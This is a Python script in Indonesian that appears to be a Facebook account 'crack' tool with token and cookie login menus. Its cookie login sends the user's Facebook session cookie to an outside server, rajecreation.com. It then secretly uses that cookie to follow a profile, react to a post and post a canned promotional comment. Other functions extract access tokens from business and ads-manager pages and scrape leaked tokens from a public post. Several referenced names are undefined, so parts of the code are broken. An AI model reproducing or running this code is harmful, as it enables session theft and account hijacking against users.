#Boleh Recode Tapi Ijin Dulu Anjing#
#No Whatsapp Author ->
#Jangan DiPerjual Belikan#
#Kalo DiPerjualBelikan Gw Sumpahin Lu Mati Anjing#
#Facebook -> Lia Canss <- #
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen3 = open('user.txt','r').read().splitlines()
except:ugen3 = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36','Mozilla/5.0 (X11; CrOS armv7l 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; EIE10;ENUSWOL)']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)','Mozilla/5.0 (X11; CrOS x86_64 6946.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36','Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/534.34','Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12B466 Safari/600.1.4','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER']

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
old_gak = []
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
#h = '\x1b[1;92m' # HIJAU
M = "\x1b[38;5;196m" # Merah
h = '\x1b[1;92m' # HIJAU
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # jingga
A = "\x1b[38;5;248m" # Abu-Abu
dn = "{d}[{g}√{d}]{p}"
er = "{d}[{r}!{d}]{p}"
pr = "{d}[{c}?{d}]{p}"
b="\033[94m"
c="\033[96m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
#h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
#p = '\x1b[0;34m' # BIRU +
#h='\033[0;90m'
kk='\033[0;32m'
ff='\033[0;36m'
#p='\033[00m'
#h='\033[0;90m'
m='\033[0;31m'
b = '\033[0;36m'
p = "\33[1;97m" # putih
l = "\33[0;37m" # putih gelap
m = "\33[1;31m" # merah
h = "\33[1;92m" # hijau
k = "\33[1;93m" # kuning
b = "\33[1;94m" # biru
u = "\33[1;95m" # ungu
s = "\33[1;96m" # biru muda
balmond = h+">"+k+"><"+h+"<"
old_gak = []
random_gak = []
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
def jakan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.08)
       
def tzy():
	os.system('clear') 
	suradadi = ["[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]"]
	for i in range(len(suradadi)):
		time.sleep(0.0080)
		sys.stdout.write("\r\x1b[0;32mLoading \x1b[0;36m: "+ random.choice(['\x1b[0;33m', '\x1b[0;36m', '\x1b[0;35m', '\x1b[0;36m', '\x1b[0;35m']) + suradadi[i % len(suradadi)])
		sys.stdout.flush()
	os.system("clear")
	memek()

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print("""┌\x1b[38;5;231mAUTHOR: HIKMAT X TEGUH
│Github : Tidak Ada
│Facebook Author 1 : Hikmat Solehudin M.M Corona
│Facebook Author 2 : Tidak Ada
│Whatsapp Author 1 : +62 838-6196-7496
│Whatsapp Author 2 : +62 882-2871-1177
│Grup : Tidak Ada
""") 

def logcok():
    ua=agent()
    try:
        cokie=open("cookies").read()
    except FileNotFoundError:
        cokie=input(f"Put your cookies\n>>> {c}")
    data={"cookie":cokie,"access_token":"","loginType":"FB","refby":"null"}
    req=requests.post("https://rajecreation.com/rajeliker/v8/login.php",data=data,headers=ua).text
    if "Login success!" in req:
       with open("cookies","w") as ck:
            ck.write(data["cookie"])
       try:
           lg=ses.get(mbasic.format("/me"),cookies={"cookie":cokie}).text
           lg=bs(lg,"html.parser").find("form",action=lambda x: "/intl/save_locale/?loc=id_ID" in x)
           dt=lg.find_all("input",type="hidden")
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           ses.post(mbasic.format(lg["action"]),data={"fb_dtsg":fg,"jazoest":jz},cookies={"cookie":cokie})
       except:
           pass
       try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies={"cookie":cokie}).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
       except:
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies={"cookie":cokie})
       except:
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies={"cookie":cokie}).text
           komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
       except:
           pass
       js=json.loads(req)
       return {"name":js["data"]["name"],"id":js["data"]["myid"],"cookie":js["data"]["cok"]}
    else:
       print(f"{er}Login Failed")
       try:
           os.system("rm cookies")
       except:
           pass
       exit()

def memek():
	banner()
	#print('%s 1. %s>_Token Gratis Bro '%(K,P))
	print('%s├ 1. %s>_Login With Token '%(M,P))
	print('%s├ 2. %s>_Login With Cookie '%(H,P))
	yu = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Pilih : ')
	if yu in ['1','01']:
		login() 
	if yu in ['2','02']:
		logcok() 
	#if yu in ['3','02']:
		#kue()
def get_token():
	url = parser(requests.get("https://free.facebook.com/100040708001839/posts/716737126359881/?app=fbl").text,"html.parser")
	data = re.findall("EAA\w+",str(url))
	for token in data:
		try:
			if len(token)>=35:
				if token in freetoken:pass
				else:
					freetoken.append(token)
					print(f"""
 [+] Status : {cekstatus(token)}
 [+] Token  : {token}""")
		except:continue

def cekstatus(token):
	try:
		url = requests.get("https://graph.facebook.com/me?access_token={token}").json()
		data = f"{H}Aktif{N}"
	except KeyError:
		data = f"{M}Kadaluwarsa{N}"
	return data



#Data Kanjut
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
	CB = dt["isp"]
except KeyError:
	IP = " "
	CN = " "
	CB = " "

def kukisw():
	jingan = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Masukan Cookie : ')
	if jingan in (''):
		jalan('└\x1b[38;5;226m►\x1b[►\x1b[38;5;196m► \x1b[38;5;196m>_Isi Yang Bener Bngsd')
	else:
		menu_test(kukis).konverter()
	login()

def konverter(kukis): 
	_header = {
	    'Host':'business.facebook.com',
		'cache-control':'max-age=0',
		'upgrade-insecure-requests':'1',
		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type' : 'text/html; charset=utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': kukis
	}
	try:
		ling = requests.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAB\w+)', ling.text)
		romz = cari.group(1)
		if 'EAAB' in romz:
			open('token.txt', 'w').write(romz)
			print (f'\n{P}> Token  : {H}{romz} ');jeda(1)
	except AttributeError:
		print("├%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
	except UnboundLocalError:
		print("├%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()

def miskoen():
	jakan('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Waitt..........')
	jalan('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Ini Whatsapp Admin \x1b[38;5;46mRedho & Hikmat') 
	#jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Whatsapp Kack Redho \x1b[38;5;46m>>>> +62 812-7214-3510') 
	jalan('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Whatsapp Kack Hikmat \x1b[38;5;46m>>>> +6283861967496')
	jalan('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Kalo Ada Yang Dibutuhkan Chat 1 Author Ini!!')
	input('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Back')
	kue()
	
	

def kue():
	print('├\x1b[38;5;196m► %s[01] %s>_Masukan Cookie Tukar Jadi Token [Dalam Perbaikan]'%(K,P))
	print('├\x1b[38;5;196m► %s[02] %s>_Minta Token\Cookie Sama Author'%(M,P))
	print('├\x1b[38;5;196m► %s[00] %s>_Exit'%(H,P))
	kannjoed = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Pilih  :  ') 
	if kannjoed in ['1','01']:
		#cookies()
		jalan('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Menu Cookie Masih Diperbaiki')
		login()
	elif kannjoed in ['2','02']:
		miskoen()
	elif kannjoed in ['0','00']:
		login()

def cookies():	
	win = '# • MASUKAN COOKIES FACEBOOK !'
	win2 = mark(win, style='white')
	sol().print(win2, style='black')		
	cookie = input(x+'\n['+k+'•'+x+'] Cookies : ')
	if cookie in [""," "]:
		print("[!!] Jangan Kosong Lah Kontoll !! ")
	else:
	       headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0',
            'Cookie': cookie

	       }
	       with requests.Session() as r:
	       	req = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
	       	cari_id = re.findall('act=(.*?)&nav_source', req.text)
	       	for z in cari_id:
	       	   rex = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={z}&nav_source=no_referrer', headers = headers)
	       	   token = re.search('(EAAB\w+)', rex.text).group(1)
	       	   print(f"\n{p}#{k} Token Kamu :{h} {token}")
	       	   
	       	   dez = '# *Salin Token Kamu Dan ketik ulang perintah > python sendyx.py'
	       	   de= mark(dez, style='green')
	       	   sol().print(de, style = 'black')
	       	   exit()

def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				#sy2 = requests.get('https://graph.facebook.com/friends?me?access_token='+tokenku[0])
				#sy3 = requests.get('https://graph.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text.json['brithday']
				#sy3 = json.loads(sy.text)['id']
				#sy4 = json.loads(sy.text)['birthday']
				#sy5 = json.loads(sy.text)['friends']
				menu()
			except KeyError:
				login_lagi()
			except requests.exceptions.ConnectionError:
				banner()
				print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Koneksi Internet Bermasalah') 
				exit()
		except IOError:
			login_lagi()      
	
def login_lagi():
	banner()
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Token Facebook ') 
	panda = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Token Fb : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Login Sukses ')
		time.sleep(2.5)
		menu()
	except KeyError:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Login Gagal ') 
		time.sleep(2.5)
		memek()
	except requests.exceptions.ConnectionError:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Koneksi Internet Bermasalah') 
		exit()
		
def menu():
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	clear()
	#ahhh = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
	#anjeng = json.loads(ahhh.text)['name']
	#anjengv2 = json.loads(ahhh.text)['friends']
	#anjengv3 = json.loads(ahhh.text)['id']
	#anjengv4 = json.loads(ahhh.text)['brithday']
